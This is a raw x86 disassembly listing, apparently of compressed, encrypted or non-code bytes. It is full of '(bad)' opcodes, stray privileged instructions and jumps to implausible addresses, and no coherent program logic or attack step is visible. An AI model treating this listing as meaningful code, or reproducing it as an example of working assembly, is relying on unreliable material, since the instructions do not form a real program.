  413d4e:	cmp    eax,0x1330488
  413d53:	test   dl,0xbc
  413d56:	xadd   BYTE PTR [eax],al
	...
  413d69:	add    BYTE PTR [eax],al
  413d6b:	add    BYTE PTR [esi+0x22],bl
  413d6e:	jg     0x413d56
  413d70:	cmp    BYTE PTR [eax-0x5f9ff7ef],dl
  413d76:	xor    al,0x30
  413d78:	xchg   DWORD PTR [eax-0x52a57ff1],esp
  413d7e:	pop    eax
  413d7f:	test   eax,0x30282893
  413d84:	pusha  
  413d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d86:	(bad)  
  413d87:	adc    eax,eax
  413d89:	push   ecx
  413d8a:	inc    ecx
  413d8b:	out    dx,al
  413d8c:	dec    esi
  413d8d:	xchg   esi,eax
  413d8e:	and    eax,DWORD PTR [eax]
  413d90:	mov    al,0x84
  413d92:	stc    
  413d93:	stc    
  413d94:	neg    bl
  413d96:	or     eax,DWORD PTR [edi]
  413d98:	cmp    DWORD PTR [edi],edx
  413d9a:	add    cl,BYTE PTR [ecx+0x1b24d7ff]
  413da0:	mov    al,0xd9
  413da2:	inc    ecx
  413da3:	out    dx,al
  413da4:	xor    eax,0xf2080fa0
  413da9:	lahf   
  413daa:	inc    esp
  413dab:	cmp    cl,0x1a
  413dae:	iret   
  413daf:	sbb    eax,0xe57fe8b0
  413db4:	push   ds
  413db5:	sahf   
  413db6:	(bad)  
  413db7:	mov    ah,0x79
  413db9:	je     0x413d7c
  413dbb:	inc    ecx
  413dbd:	inc    DWORD PTR [ebp+0x42]
  413dc0:	xlat   BYTE PTR ds:[ebx]
  413dc1:	add    DWORD PTR [eax+0x24],ebp
  413dc4:	ret    0xe8ff
  413dc7:	add    eax,DWORD PTR [edx+0x51]
  413dca:	test   al,0xb0
  413dcc:	stc    
  413dcd:	jmp    FWORD PTR [edi+0x2c]
	...
  413de4:	jns    0x413dfe
  413de6:	out    dx,al
  413de7:	adc    BYTE PTR [edi+0x3903e80b],0xf5
  413dee:	xor    eax,0xe8bee9c3
  413df3:	jl     0x413e5c
  413df5:	ds int 0xf2
  413df8:	mov    ecx,0x3904d420
  413dfd:	add    dl,ah
  413dff:	push   edx
  413e00:	cs mov ecx,0x92b00427
  413e06:	mov    ah,0x7d
  413e08:	je     0x413e86
  413e0a:	test   al,0x0
  413e0c:	shl    BYTE PTR [ecx+edi*8],0xe9
  413e10:	shr    DWORD PTR [ecx],0x69
  413e13:	and    al,BYTE PTR [edi]
  413e15:	jne    0x413deb
  413e17:	push   eax
  413e18:	(bad)  
  413e19:	mov    cl,0x27
  413e1b:	add    al,0x42
  413e1d:	lea    edx,[ebp+edi*2+0x295420f]
  413e24:	mov    eax,0x39047c1f
  413e29:	add    dl,ah
  413e2b:	push   edx
  413e2c:	push   esi
  413e2d:	lods   al,BYTE PTR ds:[esi]
  413e2e:	daa    
  413e2f:	add    al,0xc0
  413e31:	daa    
  413e32:	daa    
  413e33:	sbb    esi,DWORD PTR [ecx+eax*4]
  413e36:	inc    ebp
  413e37:	or     dh,bh
  413e39:	pop    es
  413e3a:	call   0xbb01ee3d
  413e3f:	(bad)  
  413e40:	out    dx,al
  413e41:	js     0x413e68
  413e43:	inc    ebp
  413e44:	xlat   BYTE PTR ds:[ebx]
  413e45:	out    dx,al
  413e46:	and    eax,DWORD PTR [bx+si]
	...
  413e59:	add    BYTE PTR [eax],al
  413e5b:	add    dl,ah
  413e5d:	add    BYTE PTR [eax],al
  413e5f:	jmp    0xa9f8399e
  413e64:	mov    al,al
  413e66:	call   edi
  413e68:	sub    al,0x78
  413e6a:	aad    0x28
  413e6c:	sbb    ebp,ebx
  413e6e:	mov    BYTE PTR [esi],bh
  413e70:	cld    
  413e71:	adc    eax,0xf8466003
  413e76:	cli    
  413e77:	jo     0x413e74
  413e79:	cmp    DWORD PTR [edi-0x771a781b],0x3e1dbe17
  413e83:	bound  ebp,QWORD PTR [ecx+0x4c]
  413e86:	aas    
  413e87:	cmp    al,0x7c
  413e89:	pop    es
  413e8a:	xchg   DWORD PTR [esi+0x680515f5],edi
  413e90:	sbb    ecx,DWORD PTR [ebx]
  413e92:	(bad)  
  413e93:	call   0x29f839d2
  413e98:	scas   al,BYTE PTR es:[edi]
  413e99:	sar    bh,0x6f
  413e9c:	adc    eax,DWORD PTR [eax-0x12]
  413e9f:	out    0xbd,eax
  413ea1:	push   ds
  413ea2:	sti    
  413ea3:	jmp    0x5e4c3ee2
  413ea8:	jp     0x413e5a
  413eaa:	inc    eax
  413eab:	jmp    0x8701646d
  413eb0:	sub    BYTE PTR [eax+0x3a8de6],al
  413eb6:	add    dl,dh
  413eb8:	mov    eax,edi
  413eba:	dec    esi
  413ebb:	sub    BYTE PTR ds:0x7d7479,dh
	...
  413ed1:	add    BYTE PTR [eax],al
  413ed3:	add    BYTE PTR [ebp+0xea9823d],dl
  413ed9:	js     0x413ead
  413edb:	sbb    dl,BYTE PTR [ebx]
  413edd:	js     0x413ebc
  413edf:	push   0x58
  413ee1:	(bad)  
  413ee2:	mov    bl,BYTE PTR ds:0xa855c788
  413ee8:	cmp    bh,bl
  413eea:	je     0x413eec
  413eec:	and    al,0x84
  413eee:	ffree  st(1)
  413ef0:	outs   dx,DWORD PTR ds:[esi]
  413ef1:	add    DWORD PTR [ecx+0x30ce7],eax
  413ef7:	add    bl,bl
  413ef9:	mov    cl,0x3e
  413efb:	push   esp
  413efc:	xchg   ecx,eax
  413efd:	add    cl,BYTE PTR [ecx+0xcea11df]
  413f03:	add    DWORD PTR [edi-0x1],0x5a0fffe
  413f0a:	mov    ch,0x40
  413f0c:	ret    0xfe3b
  413f0f:	mov    BYTE PTR [edi],bh
  413f11:	mov    esp,0xe22116ed
  413f16:	cli    
  413f17:	add    BYTE PTR [eax+0x50b70b02],ah
  413f1d:	dec    esp
  413f1e:	aas    
  413f1f:	add    BYTE PTR [ecx],ah
  413f21:	repz std 
  413f23:	dec    ebp
  413f24:	mov    BYTE PTR [ebx+edi*2-0x8],bh
  413f28:	pusha  
  413f29:	pop    es
  413f2a:	sub    DWORD PTR [ebx-0x76020782],0xffffffa8
  413f31:	ret    0x1fde
  413f34:	fxch   st(1)
  413f36:	iret   
  413f37:	out    dx,al
	...
  413f4c:	fld    st(2)
  413f4e:	pop    es
  413f4f:	icebp  
  413f50:	leave  
  413f51:	retf   
  413f52:	das    
  413f53:	enter  0xbcc9,0x7f
  413f57:	jecxz  0x413fd3
  413f59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5a:	test   al,0xaa
  413f5c:	adc    esp,edx
  413f5e:	das    
  413f5f:	fldcw  WORD PTR [ecx-0x1f4034]
  413f65:	mov    dl,ah
  413f67:	sar    DWORD PTR [esi-0x6df63f77],1
  413f6d:	mov    esi,ecx
  413f6f:	shr    DWORD PTR [eax+0x4],0x2f
  413f73:	enter  0xbb89,0x7f
  413f77:	jecxz  0x413fb2
  413f79:	scas   al,BYTE PTR es:[edi]
  413f7a:	add    edi,edi
  413f7c:	cmp    eax,ebp
  413f7e:	sub    cl,BYTE PTR [eax+0x723d901]
  413f84:	sub    cl,bl
  413f86:	jp     0x413f57
  413f88:	clc    
  413f89:	mov    edi,0xa1013105
  413f8e:	inc    esp
  413f8f:	sbb    dl,0x2a
  413f92:	shl    DWORD PTR [edx],cl
  413f94:	or     ch,BYTE PTR [eax]
  413f96:	sub    DWORD PTR [eax+0x123d891],ecx
  413f9c:	push   0x78c77ad9
  413fa1:	out    dx,eax
  413fa2:	repz xor BYTE PTR [ecx-0x657fbb70],cl
  413fa9:	push   cs
  413faa:	pop    es
  413fab:	dec    DWORD PTR [esi+0x882c48]
	...
  413fc1:	add    BYTE PTR [eax],al
  413fc3:	add    BYTE PTR [ecx+0x58],ah
  413fc6:	and    cl,BYTE PTR [edi]
  413fc8:	dec    eax
  413fc9:	pop    eax
  413fca:	jns    0x413f93
  413fcc:	js     0x41400d
  413fce:	(bad)  
  413fcf:	xor    BYTE PTR [ecx+0x5a8043a0],cl
  413fd5:	push   cs
  413fd6:	test   DWORD PTR [esi],0x8a2c082e
  413fdc:	cld    
  413fdd:	push   ds
  413fde:	inc    ecx
  413fdf:	loop   0x414016
  413fe1:	or     BYTE PTR [ebx],bh
  413fe3:	mov    BYTE PTR [ecx],ah
  413fe5:	call   0x7bd:0x923507bd
  413fec:	rol    BYTE PTR [esi],0xa7
  413fef:	pop    ebp
  413ff0:	xchg   edx,eax
  413ff1:	mov    al,ds:0xefb5c16
  413ff6:	add    dl,BYTE PTR [ebx-0x79]
  413ff9:	xchg   edx,eax
  413ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ffb:	and    eax,DWORD PTR [ebp-0xb]
  413ffe:	jl     0x414073
  414000:	push   ebp
  414001:	daa    
  414002:	mov    al,ds:0xf6000f84
  414007:	outs   dx,DWORD PTR ds:[esi]
  414008:	jmp    0x4783d701
  41400d:	dec    ebp
  41400e:	sub    BYTE PTR [ebx-0x4c1f3f43],dh
  414014:	fisubr WORD PTR [edx-0x6820f7be]
  41401a:	test   al,0xb6
  41401c:	jns    0x41401e
  41401e:	inc    ecx
  41401f:	cld    
  414020:	rol    BYTE PTR [ebp*1-0x41f27008],cl
  414027:	mov    ah,0x0
	...
  414039:	add    BYTE PTR [eax],al
  41403b:	add    dh,dl
  41403d:	mov    esi,0x97b70822
  414042:	sub    BYTE PTR [esi+0x1000fff9],dh
  414048:	mov    ds:0x3a90504,eax
  41404d:	inc    edx
  41404e:	lock add ebp,esp
  414051:	jbe    0x41405e
  414053:	mov    bl,0xfe
  414055:	mov    al,0x61
  414057:	mov    esi,0xf843793e
  41405c:	lods   eax,DWORD PTR ds:[esi]
  41405d:	stos   BYTE PTR es:[edi],al
  41405e:	loopne 0x414012
  414060:	push   es
  414061:	sbb    BYTE PTR [ebx],ah
  414063:	or     BYTE PTR [edi+0x4],ch
  414066:	inc    eax
  414067:	inc    esp
  414068:	repnz mov esi,0x7f578e8
  41406e:	sbb    BYTE PTR [edi+ecx*2],bl
  414071:	add    esi,DWORD PTR [ebp+0x1bbfd607]
  414077:	lds    eax,FWORD PTR [esi+0x73]
  41407a:	sub    ecx,DWORD PTR [esi+ebp*8]
  41407d:	pop    ss
  41407e:	(bad)
  414082:	add    BYTE PTR [ebp+edi*2-0x3f],al
  414086:	call   0x1849be03
  41408b:	sbb    al,0x3
  41408d:	add    eax,0x756b077d
  414092:	jmp    FWORD PTR [ebx]
  414094:	cmp    eax,0x316be7b3
  414099:	add    bh,dh
  41409b:	ret    0x177d
  41409e:	pop    esp
  41409f:	sub    eax,DWORD PTR [eax]
	...
  4140b1:	add    BYTE PTR [eax],al
  4140b3:	add    ch,dh
  4140b5:	add    edx,DWORD PTR [ebx+0x60]
  4140b8:	sbb    BYTE PTR [esi-0x15],bh
  4140bb:	stc    
  4140bc:	stos   DWORD PTR es:[edi],eax
  4140bd:	lods   eax,DWORD PTR ds:[esi]
  4140be:	mov    ah,BYTE PTR [edx+eiz*8+0x51ed7476]
  4140c5:	mov    esp,0x1b8b99f7
  4140ca:	stc    
  4140cb:	xor    bh,BYTE PTR [esi]
  4140cd:	add    cl,BYTE PTR [esp+ebp*4+0x2a82b32a]
  4140d4:	mov    ch,0xae
  4140d6:	out    0x4,eax
  4140d8:	inc    edx
  4140d9:	add    bh,dh
  4140db:	cmp    edx,0x21e940b6
  4140e1:	mov    esp,0x6a3299f7
  4140e6:	sti    
  4140e7:	div    BYTE PTR [edi]
  4140e9:	fwait
  4140ea:	mov    edi,0x8b037d9d
  4140ef:	sub    al,0x25
  4140f1:	mov    bl,0xe7
  4140f3:	jo     0x414133
  4140f5:	add    bh,dh
  4140f7:	bound  esp,QWORD PTR [ecx+0x4d248a07]
  4140fd:	js     0x414143
  4140ff:	(bad)
  414102:	out    dx,eax
  414103:	push   ecx
  414104:	jge    0x4140ba
  414106:	inc    eax
  414107:	jmp    0x1a38fcdd
  41410c:	and    eax,0x37a6fb92
  414111:	fwait
  414112:	aas    
  414113:	sub    al,0xfc
  414115:	add    cl,BYTE PTR [ebx+0x2c]
	...
  41412b:	add    BYTE PTR [ebp-0x4d],al
  41412e:	out    0x8,eax
  414130:	xor    DWORD PTR [edx],eax
  414132:	inc    BYTE PTR [eax]
  414134:	stos   DWORD PTR es:[edi],eax
  414135:	pop    eax
  414136:	cli    
  414137:	mov    ebx,DWORD PTR [ebp-0x14]
  41413a:	xchg   DWORD PTR [ebp-0x7c],eax
  41413d:	test   BYTE PTR [ebx-0x10],bl
  414140:	cmp    BYTE PTR [ebx+ecx*2+0x43881041],bh
  414147:	clc    
  414148:	mov    al,0xe6
  41414a:	inc    ebp
  41414b:	cld    
  41414c:	xchg   edx,edi
  41414e:	data16 rol ch,0x3b
  414152:	dec    BYTE PTR [ebp+ecx*4+0x39e84eee]
  414159:	clc    
  41415a:	std    
  41415b:	jmp    FWORD PTR [esi-0x5f07bc79]
  414161:	out    0xde,al
  414163:	sti    
  414164:	pop    ss
  414165:	cli    
  414166:	add    esi,0x458b54a8
  41416c:	push   eax
  41416d:	dec    edi
  41416e:	out    0xd3,al
  414170:	dec    ebx
  414171:	cli    
  414172:	std    
  414173:	pop    esi
  414174:	fild   DWORD PTR [ebx+0x7625dea]
  41417a:	(bad)  
  41417b:	push   esp
  41417c:	sbb    eax,esp
  41417e:	jg     0x41416c
  414180:	in     al,0xfb
  414182:	(bad)  
  414183:	inc    DWORD PTR [ebx+0x52]
  414186:	push   ebp
  414187:	mov    esi,DWORD PTR ds:0x54758904
  41418d:	mov    DWORD PTR [ebx+0x80],eax
	...
  4141a3:	add    BYTE PTR [esi-0x4],dh
  4141a6:	std    
  4141a7:	push   eax
  4141a8:	mov    BYTE PTR [edx+0x6860ffff],bh
  4141ae:	(bad)  
  4141af:	and    BYTE PTR [bp+si+0x3f],cl
  4141b3:	add    BYTE PTR [eax-0x72],bh
  4141b6:	cld    
  4141b7:	call   DWORD PTR [edi-0x5d752fd2]
  4141bd:	cmp    al,0x4c
  4141bf:	inc    ecx
  4141c0:	cmp    DWORD PTR [edi],edx
  4141c2:	jp     0x4141c7
  4141c4:	imul   edx,ebp,0xffffff80
  4141c7:	stc    
  4141c8:	xor    ebx,edi
  4141ca:	adc    al,dh
  4141cc:	mov    esp,0xefe05ff
  4141d1:	sbb    DWORD PTR [edx],eax
  4141d3:	add    BYTE PTR [ecx],bh
  4141d5:	jle    0x414186
  4141d7:	mov    BYTE PTR [ecx],cl
  4141d9:	xchg   ecx,eax
  4141da:	jle    0x41424f
  4141dc:	mul    DWORD PTR [edx-0x40f4cffc]
  4141e2:	ror    DWORD PTR [edx-0x1fbd444],cl
  4141e8:	ficom  WORD PTR [eax-0x3d288482]
  4141ee:	add    al,0xfe
  4141f0:	mov    ah,0x43
  4141f2:	add    al,0xfe
  4141f4:	(bad)  
  4141f5:	sahf   
  4141f6:	jbe    0x414273
  4141f8:	mov    edi,0xf70e04da
  4141fd:	push   ss
  4141fe:	jg     0x4141df
  414200:	cs sahf 
  414202:	inc    esi
  414203:	jnp    0x4141ac
  414205:	repnz add al,0xe
	...
  41421c:	out    0x3a,eax
  41421e:	shl    edi,1
  414220:	rcr    DWORD PTR [eax],0x3c
  414223:	add    bh,BYTE PTR [ecx]
  414225:	push   esi
  414226:	rol    BYTE PTR [edx+0x4851f83],0xb9
  41422d:	fiadd  WORD PTR [ebx]
  41422f:	jne    0x4142b0
  414231:	leave  
  414232:	lods   eax,DWORD PTR ds:[esi]
  414233:	out    0xe2,eax
  414235:	sub    BYTE PTR [ebx],al
  414237:	(bad)  
  414238:	mov    edx,0x5efd8a7c
  41423d:	cmp    al,BYTE PTR [edx]
  41423f:	adc    BYTE PTR [edx],0x17
  414242:	lea    esp,[esi-0x2757346]
  414248:	inc    esi
  414249:	push   edx
  41424a:	add    dh,BYTE PTR [ebp-0x61]
  41424d:	add    BYTE PTR [esi+edi*2-0x4a],dh
  414251:	add    bl,BYTE PTR [ebp+0xd187e04]
  414257:	add    edi,DWORD PTR [ecx]
  414259:	add    BYTE PTR [esi],ch
  41425b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41425c:	xor    DWORD PTR [edi-0x6c],0xffffffa6
  414260:	clc    
  414261:	imul   eax
  414263:	scas   al,BYTE PTR es:[edi]
  414264:	rcr    DWORD PTR [edx],0x67
  414267:	pop    ss
  414268:	mov    dl,0xfe
  41426a:	call   0xbdebac72
  41426f:	js     0x414206
  414271:	clc    
  414272:	jno    0x414202
  414274:	inc    edx
  414275:	jae    0x4142e2
  414277:	and    esp,0x0
  41427a:	dec    ebp
  41427b:	mov    bl,0xd6
  41427d:	add    al,ch
  41427f:	add    eax,DWORD PTR [eax]
	...
  414291:	add    BYTE PTR [eax],al
  414293:	add    BYTE PTR [ecx],bh
  414295:	xchg   esi,eax
  414296:	call   0xa7f35136
  41429b:	add    edx,ecx
  41429d:	sub    al,0x2b
  41429f:	add    al,0xbf
  4142a1:	into   
  4142a2:	cmp    bh,BYTE PTR [ecx-0x48]
  4142a5:	mov    edi,0x78aec2ae
  4142aa:	in     al,dx
  4142ab:	sar    eax,1
  4142ad:	jl     0x4142c1
  4142af:	repz and cl,BYTE PTR [edi]
  4142b2:	sub    eax,0xfd020e7e
  4142b7:	add    edi,DWORD PTR [ecx]
  4142b9:	add    cl,ch
  4142bb:	add    edx,DWORD PTR [edx-0x4eeca055]
  4142c1:	jp     0x41431f
  4142c3:	add    dh,BYTE PTR [edi+0x0]
  4142c6:	pop    ss
  4142c7:	(bad)  
  4142c8:	pusha  
  4142c9:	iret   
  4142ca:	popa   
  4142cb:	mov    ebp,ebp
  4142cd:	add    ebp,ecx
  4142cf:	add    esi,DWORD PTR [ecx+0x5702447a]
  4142d5:	add    BYTE PTR [ebp-0xfe3a77],bh
  4142db:	mov    ch,0x3a
  4142dd:	jbe    0x41426b
  4142df:	sub    eax,0xf6fe023b
  4142e4:	clc    
  4142e5:	add    DWORD PTR [ecx-0x44764577],eax
  4142eb:	adc    eax,0xdefdfe3b
  4142f0:	loopne 0x41432f
  4142f2:	das    
  4142f3:	add    ebp,0xeac3ff
	...
  414309:	add    BYTE PTR [eax],al
  41430b:	add    BYTE PTR [edx],bh
  41430d:	inc    ecx
  41430e:	inc    edx
  41430f:	push   0x7
  414311:	adc    DWORD PTR [ebx-0x1c],edi
  414314:	mov    edx,0xdc0039
  414319:	push   edi
  41431a:	push   esi
  41431b:	push   ecx
  41431c:	cmp    edi,esp
  41431e:	std    
  41431f:	push   esi
  414320:	mov    esi,0x3a4f78a3
  414325:	inc    BYTE PTR [eax]
  414327:	imul   edx,DWORD PTR [esi],0xb6867300
  41432d:	mov    ebx,0xfe3a3778
  414332:	add    BYTE PTR [eax+ebx*4+0x3b69838b],dh
  414339:	(bad)  
  41433a:	std    
  41433b:	mov    ecx,0xe900a7a2
  414340:	cmp    bl,BYTE PTR [ebp+0x5e]
  414343:	mov    dl,0xad
  414345:	in     al,dx
  414346:	pop    ebx
  414347:	sub    eax,DWORD PTR [ebp+0x0]
  41434a:	push   ecx
  41434b:	xchg   edi,eax
  41434c:	xrelease mov BYTE PTR [ebp+ecx*8+0x2a],al
  414351:	mov    WORD PTR [ebp+0x6c661456],cx
  414358:	xchg   edi,eax
  414359:	jae    0x414364
  41435b:	jo     0x4142dd
  41435d:	mov    edi,DWORD PTR [eax-0x7]
  414360:	sar    BYTE PTR [ecx+0x84fe8ff],1
  414366:	mov    eax,DWORD PTR [eax]
  414368:	adc    BYTE PTR [eax*4-0x2dcb0939],dl
  41436f:	sldt   WORD PTR [eax]
	...
  414382:	add    BYTE PTR [eax],al
  414384:	(bad)  
  414385:	aam    0x52
  414387:	adc    DWORD PTR [eax-0x5b17aff5],0xfffffffa
  41438e:	sti    
  41438f:	dec    DWORD PTR [eax+0x44]
  414392:	dec    ecx
  414393:	inc    ecx
  414394:	adc    bl,ch
  414396:	cmp    bh,cl
  414398:	scas   eax,DWORD PTR es:[edi]
  414399:	add    DWORD PTR [esi],ecx
  41439b:	mov    bh,0xdb
  41439d:	push   ebp
  41439e:	push   ebx
  41439f:	call   0x3d3db4
  4143a4:	cmp    ah,al
  4143a6:	dec    ecx
  4143a7:	inc    ecx
  4143a8:	adc    bl,ch
  4143aa:	es stc 
  4143ac:	pop    edi
  4143ad:	add    cl,BYTE PTR [esi]
  4143af:	mov    bh,0x7b
  4143b1:	push   esi
  4143b2:	push   esi
  4143b3:	call   0x3d3d64
  4143b8:	(bad)  
  4143b9:	pusha  
  4143ba:	push   edi
  4143bb:	ret    0x2c8
  4143be:	dec    edi
  4143bf:	mov    ebp,DWORD PTR [esi+eiz*1+0xe785308]
  4143c6:	cmc    
  4143c7:	dec    DWORD PTR [edi]
  4143c9:	test   BYTE PTR [edi+0x2a080],bh
  4143cf:	mov    eax,0x3d4fe0
  4143d4:	sbb    edx,DWORD PTR [ebx]
  4143d6:	test   DWORD PTR [ebx],edx
  4143d8:	adc    eax,ebx
  4143da:	add    al,0x83
  4143dc:	arpl   WORD PTR [edi],ax
  4143de:	cmp    eax,eax
  4143e0:	fld    QWORD PTR [ebx+0x0]
  4143e3:	jb     0x414424
  4143e5:	mov    ebx,0x4dc0
	...
  4143fa:	add    BYTE PTR [eax],al
  4143fc:	rol    DWORD PTR [edx],1
  4143fe:	xchg   DWORD PTR [eax],edx
  414400:	jmp    0x5501c319
  414405:	cmp    DWORD PTR [edi+0x44143904],0x4e
  41440c:	clc    
  41440d:	call   0xab343185
  414412:	or     BYTE PTR [eax],al
  414414:	jmp    0xec1a:0x31246071
  41441b:	call   0x8040f161
  414420:	cli    
  414421:	addr16 add al,0x0
  414424:	cmp    DWORD PTR [edi+0x44],ebx
  414427:	dec    ebx
  414428:	js     0x414411
  41442a:	mov    WORD PTR [ecx],ss
  41442c:	mov    al,0xf7
  41442e:	test   cl,al
  414430:	cmp    eax,0x4c04c46a
  414435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414436:	dec    ebp
  414437:	aas    
  414438:	cmp    ecx,edi
  41443a:	lock mov eax,0x411cf9
  414440:	ret    0x8afa
  414443:	adc    BYTE PTR [edx-0x67ef7d6],bh
  414449:	jmp    0x414489
  41444b:	inc    eax
  41444c:	outs   dx,DWORD PTR ds:[esi]
  41444d:	test   al,0x1
  41444f:	jb     0x414437
  414451:	mov    ds:0x943904c3,al
  414456:	mov    ah,bl
  414458:	mov    edx,0x67511c43
  41445d:	bound  ebx,QWORD PTR [ebp+0x8]
	...
  414474:	ret    0xd9c
  414477:	mov    esi,esp
  414479:	push   ds
  41447a:	push   esp
  41447b:	push   ecx
  41447c:	xchg   ecx,eax
  41447d:	add    al,0xfc
  41447f:	std    
  414480:	sahf   
  414481:	pop    esp
  414482:	inc    ebp
  414483:	lock jmp 0xe94987fc
  414489:	push   cs
  41448a:	in     al,0xf8
  41448c:	xchg   dh,dh
  41448e:	mov    es,WORD PTR [ebx-0x6f]
  414491:	xchg   edi,eax
  414492:	test   cl,al
  414494:	dec    ecx
  414495:	add    BYTE PTR [edx],bh
  414497:	in     al,dx
  414498:	mov    al,bh
  41449a:	fiadd  WORD PTR [eax]
  41449c:	sar    BYTE PTR [edi-0x74c6bcdd],1
  4144a2:	and    al,0xfc
  4144a4:	jmp    0x4d3c8990
  4144a9:	std    
  4144aa:	dec    edi
  4144ab:	(bad)  
  4144ac:	cmc    
  4144ad:	ds out 0x8e,eax
  4144b0:	cli    
  4144b1:	out    dx,eax
  4144b2:	pop    ss
  4144b3:	in     al,dx
  4144b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b5:	mul    DWORD PTR [esi+0x2bc0a000]
  4144bb:	inc    ebx
  4144bc:	cmp    DWORD PTR [ebx-0x177613d4],ecx
  4144c2:	or     bl,bh
  4144c4:	adc    al,0xfd
  4144c6:	jb     0x414526
  4144c8:	or     eax,0xbef42489
  4144cd:	inc    edx
  4144ce:	jae    0x41445a
  4144d0:	(bad)  
  4144d1:	lock bound ebx,QWORD PTR [esi-0x13]
  4144d5:	mov    BYTE PTR [ebx+ebp*8+0x0],ch
	...
  4144ec:	mov    dh,0x42
  4144ee:	push   ebx
  4144ef:	mov    al,BYTE PTR [edx+0x7243bfe8]
  4144f5:	aas    
  4144f6:	out    0x8e,eax
  4144f8:	jp     0x4144f2
  4144fa:	xchg   edi,eax
  4144fb:	jmp    0x41450d
  4144fd:	idiv   DWORD PTR [esi]
  4144ff:	add    BYTE PTR [eax+0x40],dl
  414502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414503:	inc    edx
  414504:	cmp    DWORD PTR [ebx-0x17f60c5c],ecx
  41450a:	aam    0xfa
  41450c:	lods   al,BYTE PTR ds:[esi]
  41450d:	cld    
  41450e:	pop    DWORD PTR [ebx-0xe]
  414511:	ds out 0x8e,eax
  414514:	cli    
  414515:	out    0xb7,eax
  414517:	jmp    0x41454d
  414519:	test   DWORD PTR [esi],0xfb5ac300
  41451f:	mov    edi,edx
  414521:	out    dx,eax
  414522:	add    BYTE PTR [eax-0x9],ah
  414525:	sti    
  414526:	xchg   DWORD PTR [edx+ebp*2-0x3d22a47a],ecx
  41452d:	inc    eax
  41452e:	call   0x883535a3
  414533:	xor    al,0x4d
  414535:	rcr    BYTE PTR [si],0xfc
  414539:	dec    DWORD PTR [edx-0x17b0b2d4]
  41453f:	rol    BYTE PTR [ebp-0x6],0xfd
  414543:	inc    ecx
  414544:	jne    0x41458e
  414546:	aas    
  414547:	jmp    0x3a318515
  41454c:	sbb    eax,0x9ef8ea
	...
  414561:	add    BYTE PTR [eax],al
  414563:	add    BYTE PTR [esi],ah
  414565:	imul   eax,eax,0x8b007424
  41456b:	and    al,0x25
  41456d:	push   ecx
  41456e:	call   0xfe3f5317
  414573:	pop    ss
  414574:	test   al,0x3f
  414576:	clc    
  414577:	sbb    DWORD PTR ds:0xf66ef885,ecx
  41457d:	xchg   DWORD PTR [esi-0xf],eax
  414580:	mov    al,BYTE PTR [edi-0x1772a6bd]
  414586:	jne    0x4145d9
  414588:	fdivp  st(5),st
  41458a:	and    DWORD PTR [edi],0xac8b522d
  414590:	loop   0x4145e2
  414592:	call   0xfe3f086a
  414597:	xchg   edi,eax
  414598:	arpl   WORD PTR [ebx+0x8788cec],ax
  41459e:	add    BYTE PTR [ebp+edi*4-0x36f28021],bh
  4145a5:	sti    
  4145a6:	std    
  4145a7:	jmp    0x629697b7
  4145ac:	sbb    BYTE PTR [eax],cl
  4145ae:	mov    DWORD PTR [eax],eax
  4145b0:	or     eax,0x1085890b
  4145b5:	cli    
  4145b6:	sti    
  4145b7:	jmp    DWORD PTR [eax+0x67fe54e7]
  4145bd:	cli    
  4145be:	push   0x0
  4145c0:	or     BYTE PTR [esi+ecx*2+0x41],al
  4145c4:	push   eax
  4145c5:	out    0xe5,eax
  4145c7:	std    
	...
  4145dc:	xchg   edx,edi
  4145de:	sub    eax,0x4080dad2
  4145e3:	dec    esi
  4145e4:	and    DWORD PTR [eax+ecx*4],eax
  4145e7:	add    al,0x42
  4145e9:	inc    ecx
  4145ea:	jg     0x4145e6
  4145ec:	push   0x9dc7ed7b
  4145f1:	ja     0x4145f1
  4145f3:	call   edi
  4145f5:	add    eax,DWORD PTR [eax]
  4145f7:	add    BYTE PTR [eax],dl
  4145f9:	out    0x54,al
  4145fb:	mov    eax,eax
  4145fd:	mov    eax,DWORD PTR [ecx-0x406398c]
  414603:	xor    DWORD PTR [edx-0x6274cf1b],esi
  414609:	jae    0x414609
  41460b:	inc    DWORD PTR [edi+0x667c818c]
  414611:	cli    
  414612:	sti    
  414613:	call   FWORD PTR [ebp+0x73]
  414616:	(bad)  
  414617:	inc    DWORD PTR [edi-0x7983767a]
  41461d:	cli    
  41461e:	sti    
  41461f:	shufps xmm7,xmm5,0x7e
  414623:	loopne 0x41461c
  414625:	test   DWORD PTR [ecx-0x405f984],edi
  41462b:	(bad)  
  41462d:	cmp    ch,BYTE PTR ds:0xc60418f8
  414633:	add    esp,DWORD PTR [eax+0x5a83423d]
  414639:	pop    ss
  41463a:	jns    0x414641
  41463c:	cmp    DWORD PTR [ecx+0x3a],ebp
	...
  414653:	add    BYTE PTR [ebx+eiz*1],cl
  414656:	push   ebx
  414657:	push   esi
  414658:	mov    eax,ds:0x86fdfb88
  41465d:	gs test al,0x78
  414660:	jg     0x414653
  414662:	sti    
  414663:	add    BYTE PTR [ecx-0x698cfe53],bh
  414669:	gs mov ebp,0xfbd96778
  41466f:	add    ah,ah
  414671:	jb     0x414600
  414673:	cmp    DWORD PTR [ecx-0x16020436],0xffffffd0
  41467a:	(bad)  
  41467b:	sti    
  41467c:	inc    esi
  41467d:	mov    ecx,0x5fe25e5b
  414682:	lock pop ebx
  414684:	sti    
  414685:	fild   WORD PTR [ecx]
  414687:	push   ebx
  414688:	ror    BYTE PTR [esp+edx*2-0x78ce75b0],0x53
  414690:	xor    DWORD PTR [esi+0x5d],ebx
  414693:	or     al,0xc2
  414695:	adc    al,0x14
  414697:	das    
  414698:	add    BYTE PTR [esi+0x8],ch
  41469b:	cmpxchg DWORD PTR [ebx],esp
  41469e:	or     eax,0x12ebb3f8
  4146a3:	mov    BYTE PTR ds:0xf08142d0,bh
  4146a9:	out    dx,eax
  4146aa:	jge    0x414697
  4146ac:	mov    dh,BYTE PTR [ebp+0x52e3ace9]
  4146b2:	sti    
  4146b3:	das    
  4146b4:	jmp    0x414712
  4146b6:	adc    BYTE PTR [edx],bl
	...
  4146cc:	ret    
  4146cd:	jmp    0x4146fe
  4146cf:	xor    bh,BYTE PTR [eax]
  4146d1:	outs   dx,DWORD PTR ds:[esi]
  4146d2:	add    DWORD PTR [edx-0x46],eax
